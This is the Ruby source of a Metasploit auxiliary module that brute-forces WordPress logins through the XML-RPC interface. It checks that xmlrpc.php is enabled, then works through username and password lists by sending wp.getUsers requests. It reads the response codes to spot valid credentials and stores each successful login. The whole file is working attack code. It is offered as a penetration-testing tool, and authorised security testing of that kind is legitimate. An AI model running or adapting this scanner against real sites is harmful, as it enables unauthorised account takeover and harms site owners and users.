##
# wordpress_xmlrpc_login.rb
##

##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
     'Name'         => 'Wordpress XML-RPC Username/Password Login Scanner',
     'Description'  => '
       This module attempts to authenticate against a Wordpress-site
       (via XMLRPC) using username and password combinations indicated
       by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
      ',
     'Author'      =>
       [
         'Cenk Kalpakoglu <cenk.kalpakoglu[at]gmail.com>',
       ],
     'License'     => MSF_LICENSE,
     'References'  =>
       [
         ['URL', 'https://wordpress.org/'],
         ['URL', 'http://www.ethicalhack3r.co.uk/security/introduction-to-the-wordpress-xml-rpc-api/'],
         ['CVE', '1999-0502'] # Weak password
       ]
      ))

    register_options(
        [
          Opt::RPORT(80),
          OptString.new('TARGETURI', [true, 'The path to wordpress xmlrpc file, default is /xmlrpc.php', '/xmlrpc.php']),
          # OptBool.new('VERBOSE', [false, 'Whether to print output for all attempts', false]) # warning
        ], self.class)

    deregister_options('BLANK_PASSWORDS') # we don't need this option
  end

  def xmlrpc_enabled?
    xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
    xml << '<methodCall>'
    xml << '<methodName>demo.sayHello</methodName>'
    xml << '<params>'
    xml << '<param></param>'
    xml << '</params>'
    xml << '</methodCall>'

    res = send_request_cgi(
      'uri'       => datastore['TARGETURI'],
      'method'    => 'POST',
      'data'      => "#{xml}"
    )

    if res && res.body =~ /<string>Hello!<\/string>/
      return true # xmlrpc is enabled
    end
  end

  def generate_xml_request(user, pass)
    xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
    xml << '<methodCall>'
    xml << '<methodName>wp.getUsers</methodName>'
    xml << '<params><param><value>1</value></param>'
    xml << "<param><value>#{user}</value></param>"
    xml << "<param><value>#{pass}</value></param>"
    xml << '</params>'
    xml << '</methodCall>'
    xml
  end

  def run_host(_ip)
    print_status("Checking #{rhost}:#{datastore['TARGETURI']} for xmlrpc..")
    if !xmlrpc_enabled?
      print_error("#{rhost} XMLRPC is not enabled! -- Aborting")
      return :abort
    else
      vprint_good('XMLRPC enabled, Hello message received!')
    end

    print_status("#{rhost}:#{rport} - Starting XML-RPC login sweep")
    each_user_pass do |user, pass|
      if user != "" # empty line fix ?
        do_login(user, pass)
      end
    end
  end

  def do_login(user, pass)
    vprint_status("Trying username:'#{user}' with password:'#{pass}'")
    xml_req = generate_xml_request(user, pass)
    begin
      res = send_request_cgi(
        {
          'uri'       => datastore['TARGETURI'],
          'method'    => 'POST',
          'data'      => "#{xml_req}"
        }, 25)
      http_fingerprint(response: res)
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error('HTTP Connection Failed, Aborting')
      return :abort
    end

    unless res
      print_error('Connection timed out, Aborting')
      return :abort
    end

    if res.code != 200
      vprint_error("FAILED LOGIN. '#{user}' : '#{pass}'")
      return :skip_pass
    end

    if res.code == 200
      # TODO: add more error codes
      if res.body =~ /<value><int>403<\/int><\/value>/
        vprint_error("FAILED LOGIN. '#{user}' : '#{pass}'")
        return :skip_pass

      elsif res.body =~ /<value><int>-32601<\/int><\/value>/
        print_error('Server error: Requested method `wp.getUsers` does not exists. -- Aborting')
        return :abort

      elsif res.body =~ /<value><int>401<\/int><\/value>/ || res.body =~ /<name>user_id<\/name>/
        print_good("SUCESSFUL LOGIN. '#{user}' : '#{pass}'")
        # If verbose set True, dump xml response
        vprint_good("#{res}")

        report_hash = {
          host: datastore['RHOST'],
          port: datastore['RPORT'],
          sname: 'wordpress-xmlrpc',
          user: user,
          pass: pass,
          active: true,
          type: 'password' }

        report_auth_info(report_hash)
        return :next_user
      end
    end
  end
end
